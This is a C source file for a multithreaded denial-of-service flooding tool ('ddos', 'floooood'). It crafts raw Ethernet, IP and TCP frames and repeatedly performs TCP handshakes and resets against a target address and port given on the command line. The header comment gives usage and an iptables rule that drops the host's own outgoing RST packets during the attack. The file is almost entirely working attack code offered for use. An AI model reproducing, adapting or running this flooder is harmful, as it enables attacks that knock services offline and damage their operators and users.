/*
 * Copyright (c) 2025, oldteam. All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *   this list of conditions and the following disclaimer in the documentation
 *   and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * for work disable filter:
 *   sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
 *
 * after work, you can turn it on like this:
 *   sudo iptables -D OUTPUT -p tcp --tcp-flags RST RST -j DROP
 *
 * ./a.out <ip> <dstport> <threads> <pps, 0 for no limit>
 *
 * and don't forget to change this:
 *   char _device[] = "enp7s0";
 *   u8 _macdst[6]  = {0x4, 0xbf, 0x6d, 0xd, 0x3a, 0x50};
 *   u8 _macsrc[6]  = {0x40, 0xb0, 0x76, 0x47, 0x8f, 0x9a};
 *   u8 _ipsrc[4]   = {192,168,1,33};
 */

#include <linux/if_ether.h>
#include <netinet/in.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <stdnoreturn.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <sys/param.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <sys/ioctl.h>
#include <sys/ucontext.h>
#include <unistd.h>
#include <netdb.h>
#include <time.h>

typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef uint64_t u64;

#define MAXFDS 1000
#define NUMFDS 600
#define ip_check_carry(x) \
  (x=(x>>16)+(x&0xffff),(~(x+(x>>16))&0xffff))

/* change this: */
char _device[] = "enp7s0";
u8 _macdst[6]  = {0x4, 0xbf, 0x6d, 0xd, 0x3a, 0x50};
u8 _macsrc[6]  = {0x40, 0xb0, 0x76, 0x47, 0x8f, 0x9a};
u8 _ipsrc[4]   = {192,168,1,33};

u8 _ipdst[4];
static pthread_mutex_t call_mutex=PTHREAD_MUTEX_INITIALIZER;
static pthread_cond_t call_cond=PTHREAD_COND_INITIALIZER;
static u64 Q[4096], c=362436;
struct sockaddr_ll sll={0};
int fds[MAXFDS];
struct ifreq ifr={0};
size_t fdcur=0, total=0, total_calls=0;
size_t pps=0, threadsnum=0, fdnum=NUMFDS, dstport=0;

/* funcs */
u64 random_seed_u64(void);
u64 cmwc(void);
void cmwc_seed(u64 seed);
u64 cmwc_random_num(u64 min, u64 max);
u32 random_u32(void);
u16 random_u16(void);
u8 random_u8(void);
u16 random_check(void);
u16 random_srcport(void);
int ip_check_add(const void *buf,
  size_t len, int check);
u16 in_check(u16 *ptr, int nbytes);
u16 ip4_pseudocheck(const u8 *src, const u8 *dst,
  u8 proto, u16 len, const void *hstart);

inline static void tcpframe_fill(u8 *dst, size_t dstlen,
  u8 *macsrc, u8 *macdst, u8 *ipsrc, u8 *ipdst,
  u16 srcport, u32 seq, u32 ack, u8 flags);

inline static ssize_t tcpframe_extract(int fd,
    u8 *ipsrc, u8 *buf, size_t buflen);

inline static void tcphandshake(int fd,
    struct sockaddr_ll sll);

inline static void openfds(void);
inline static void closefds(void);
inline static void resetcall(void);
inline static void *preddos(void *arg);
static void ddos(void);
static noreturn void stop(int sig);
int main(int argc, char **argv);

int ip_check_add(const void *buf, size_t len, int check)
{
  u16 *sp = (u16*)buf;
  int n, sn;

  sn = len / 2;
  n = (sn + 15) / 16;

  switch (sn % 16) {
  case 0: do {
    check += *sp++;
  case 15:
    check += *sp++;
  case 14:
    check += *sp++;
  case 13:
    check += *sp++;
  case 12:
    check += *sp++;
  case 11:
    check += *sp++;
  case 10:
    check += *sp++;
  case 9:
    check += *sp++;
  case 8:
    check += *sp++;
  case 7:
    check += *sp++;
  case 6:
    check += *sp++;
  case 5:
    check += *sp++;
  case 4:
    check += *sp++;
  case 3:
    check += *sp++;
  case 2:
    check += *sp++;
  case 1:
    check += *sp++;
    } while (--n > 0);
  }

  if (len & 1)
    check += htons(*(u_char *)sp << 8);

  return check;
}

u16 in_check(u16 *ptr, int nbytes)
{
  int sum;
  sum=ip_check_add(ptr, nbytes, 0);
  return ip_check_carry(sum);
}

u16 ip4_pseudocheck(const u8 *src, const u8 *dst,
  u8 proto, u16 len, const void *hstart)
{
  struct pseudo
  {
    u8  src[4];
    u8  dst[4];
    u8  zero;
    u8  proto;
    u16 length;
  } hdr;
  int sum;

  memcpy(hdr.src, src, 4);
  memcpy(hdr.dst, dst, 4);
  hdr.zero=0;
  hdr.proto=proto;
  hdr.length=htons(len);

  sum=ip_check_add(&hdr, sizeof(hdr), 0);
  sum=ip_check_add(hstart, len, sum);
  sum=ip_check_carry(sum);

  /* RFC 768: "If the computed  checksum  is zero,  it is transmitted  as all
   * ones (the equivalent  in one's complement  arithmetic).   An all zero
   * transmitted checksum  value means that the transmitter  generated  no
   * checksum" */
  if (proto==IPPROTO_UDP&&sum==0)
    sum=0xFFFF;

  return sum;
}

inline static void tcpframe_fill(u8 *dst, size_t dstlen,
  u8 *macsrc, u8 *macdst, u8 *ipsrc, u8 *ipdst,
  u16 srcport, u32 seq, u32 ack, u8 flags)
{
  u8 i;
  if (!dst||!dstlen)
    return;
  /* eth */
  for (i=0;i<6;i++)
    dst[i]=macdst[i],dst[i+6]=macsrc[i];
  dst[12]=0x08,dst[13]=0x00;
  /* ip4 */
  dst[0+14]=(4<<4)|5/* 5+(optslen/4) */,
  dst[1+14]=0, *(u16*)&dst[2+14]=htons((20+20/* + optslen */)),
  *(u16*)&dst[4+14]=htons(6734), *(u16*)&dst[6+14]=0,
  dst[8+14]=64, dst[9+14]=6 /* tcp */, *(u16*)&dst[10+14]=0;
  for (i=0;i<4;i++)
    dst[12+i+14]=ipsrc[i],dst[12+4+i+14]=ipdst[i];
  *(u16*)&dst[10+14]=in_check((u16*)(dst+14), 20);
  /* tcp */
  *(u16*)&dst[0+34]=htons(srcport),
  *(u16*)&dst[2+34]=htons(dstport), /* dst */ *(u32*)&dst[4+34]=htonl(seq),
  *(u32*)&dst[8+34]=htonl(ack), dst[12+34]=(5/*5+(optslen/4)*/<<4)|(0&0x0f),
  dst[13+34]=flags, *(u16*)&dst[14+34]=htons(1024), *(u16*)&dst[16+34]=0,
  *(u16*)&dst[18+34]=htons(0), *(u16*)&dst[16+34]=ip4_pseudocheck(ipsrc, ipdst,
      6, 20, (dst+34));
}


u64 random_seed_u64(void)
{
  struct timespec ts;
  if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0)
    return -1;
  return ((u64)(ts.tv_sec*1000000000ULL
    +ts.tv_nsec));
}

u64 cmwc(void)
{
  u64 x, r=0xfffffffe, t;
  static u64 i=4095;

  i=(i+1)&4095;
  t=18782LL*Q[i]+c;
  c=(t>>32);
  x=t+c;

  if (x<c) {
    x++;
    c++;
  }

  return (Q[i]=r-x);
}

void cmwc_seed(u64 seed)
{
  int i;
  Q[0]=seed;
#define PHI 0x9e3779b9
  Q[1]=seed+PHI;
  Q[2]=seed+PHI+PHI;
  for (i=3;i<4096;i++)
    Q[i]=Q[i-3]^Q[i-2]^PHI^i;
}

u64 cmwc_random_num(u64 min, u64 max)
{
  u64 range=0;
  if (min>max)
    return 1;
  range=(max>=min)?(max-min):(sizeof(u64)-min);
  return (min+(cmwc()%range+1));
}

u32 random_u32(void) { return (u32)cmwc_random_num(0, UINT_MAX); }
u16 random_u16(void) { return (u16)cmwc_random_num(0, USHRT_MAX); }
u8 random_u8(void) { return (u8)cmwc_random_num(0, UCHAR_MAX); }
u16 random_check(void) { return random_u16(); }
u16 random_srcport(void) { return((u16)cmwc_random_num(49151, USHRT_MAX)); }

inline static ssize_t tcpframe_extract(int fd, u8 *ipsrc, u8 *buf, size_t buflen)
{
  ssize_t ret;
  for (ret=0;ret!=-1&&(buf[30]!=ipsrc[0]&&
      buf[30+1]!=ipsrc[1]&&buf[30+2]!=ipsrc[2]&&
      buf[30+3]!=ipsrc[3]);ret=recv(fd, buf, buflen, 0));
  return ret;
}

inline static void tcphandshake(int fd, struct sockaddr_ll sll)
{
  u8 frame[54], recv[1024];
  u32 c_seq, c_ack, *p;
  u16 srcport;

  c_ack=0, c_seq=random_u32(), srcport=random_srcport();

  /* SYN */
  tcpframe_fill(frame, sizeof(frame), _macsrc,
    _macdst, _ipsrc, _ipdst, srcport, c_seq,
    c_ack, 2);
  sendto(fd, frame, sizeof(frame), 0,
    (struct sockaddr*)&sll, sizeof(sll));

  /* SYN+ACK */
  tcpframe_extract(fd, _ipsrc, recv, sizeof(recv));
  p=(u32*)(recv+(14+20+4));
  c_seq=ntohl(*p), p++, c_ack=ntohl(*p), c_seq++;

  /* ACK */
  tcpframe_fill(frame, sizeof(frame), _macsrc,
    _macdst, _ipsrc, _ipdst, srcport, c_ack,
    c_seq, 0x10);
  sendto(fd, frame, sizeof(frame), 0,
    (struct sockaddr*)&sll, sizeof(sll));

  /* RST */
  tcpframe_fill(frame, sizeof(frame), _macsrc,
    _macdst, _ipsrc, _ipdst, srcport, c_seq,
    random_u32(), 4);
  sendto(fd, frame, sizeof(frame), 0,
    (struct sockaddr*)&sll, sizeof(sll));
}

inline static void openfds(void)
{
  size_t j;
  memset(&fds, 0, MAXFDS);
  j=0;
  if ((fds[j]=socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL)))==-1)
    fprintf(stderr, "failed open fd\n");
  strlcpy(ifr.ifr_name, _device, sizeof(ifr.ifr_name));
  if (ioctl(fds[j], SIOCGIFINDEX, &ifr)<0)
    fprintf(stderr, "failed getting if_index\n");
  sll.sll_family=AF_PACKET, sll.sll_ifindex=ifr.ifr_ifru.ifru_ivalue,
  sll.sll_protocol=ETHERTYPE_IP;
  for (j++,fdnum--;fdnum;fdnum--)
    fds[++j]=socket(PF_PACKET,
      SOCK_RAW,htons(ETH_P_ALL));
}

inline static void closefds(void)
{
  size_t i;
  for (i=0;i<MAXFDS;)
    if (fds[i++])
      close(fds[i]);
}

inline static void resetcall(void)
{
  for (;;) {
    usleep(1000000);
    pthread_mutex_lock(&call_mutex);
    total_calls=0;
    pthread_cond_broadcast(&call_cond);
    pthread_mutex_unlock(&call_mutex);
  }
}

inline static void *preddos(void *arg)
{
  int fd;
  fd=-1;
  if (fdcur>=fdnum)
    fdcur=0;
  for (;fd<0;)
    fd=fds[fdcur++];
  for (;;) {
    total++;
    if (pps!=0) {
      for (;total_calls>=pps;)
        pthread_cond_wait(&call_cond, &call_mutex);
      total_calls++;
      tcphandshake(fd, sll);
      usleep((1000000/pps));
    }
    else {
      total_calls++;
      tcphandshake(fd, sll);
    }
  }
  return NULL;
}

static void ddos(void)
{
  pthread_t threads[threadsnum];
  pthread_t reset_thread;
  size_t i;

  pthread_create(&reset_thread, NULL, (void *(*)(void *))resetcall, NULL);
  for (i=0;i<threadsnum;++i)
    pthread_create(&threads[i], NULL, preddos, NULL);
  for (i=0;i<threadsnum;++i)
    pthread_join(threads[i], NULL);
  pthread_join(reset_thread, NULL);
}

static noreturn void stop(int sig)
{
  closefds();
  exit(0);
}

/* from libncsnet */
int ip4t_pton(const char *p, u8 *ip4)
{
  char *ep;
  u8 *data;
  long l;
  int i;

  if (!p||!ip4)
    return -1;

  data=(u8*)ip4;
  ep=NULL;
  i=l=0;

  for (;i<4;i++) {
    l=strtol(p, &ep, 10);
    if (ep==p||l<0||l>0xff||
      (i<4-1&&*ep!='.'))
      break;
    data[i]=(u8)l;
    p=ep+1;
  }

  return ((i==4&&*ep=='\0')?0:1);
}

int main(int argc, char **argv)
{
  signal(SIGINT, stop);
  if (argc<=4) {
    fprintf(stdout,"%s <ip> <dstport> <threads> <pps, 0 for no limit>\n", argv[0]);
    exit(0);
  }
  cmwc_seed(random_seed_u64());
  ip4t_pton(argv[1], _ipdst), dstport=atoi(argv[2]), threadsnum=atoi(argv[3]), pps=atoi(argv[4]);
  openfds();
  fprintf(stdout, "floooood.\n");
  ddos();
  closefds();
  return 0;
}
